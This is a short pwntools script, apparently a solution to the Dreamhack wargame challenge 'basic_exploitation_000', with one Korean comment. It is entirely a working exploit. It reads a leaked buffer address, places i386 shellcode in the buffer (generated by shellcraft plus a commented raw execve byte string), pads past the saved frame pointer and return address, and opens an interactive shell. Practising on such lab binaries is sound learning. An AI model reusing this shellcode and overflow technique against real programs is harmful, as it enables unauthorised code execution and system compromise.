from pwn import *

context.arch="i386"
p = process('./basic_exploitation_000')
# p = remote('host3.dreamhack.games', 19424)
p.recvuntil("buf = (")
buf_address=int(p.recv(10), 16) # 수신한 문자열을 16진수로 변환하여 정수로 저장
sh = asm(shellcraft.sh())
payload= sh#b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
payload+=b'A'*(0x80-len(payload))
payload+=b'B'*(0x4)
payload+=p32(buf_address)
# print(payload)
p.send(payload)
p.interactive()
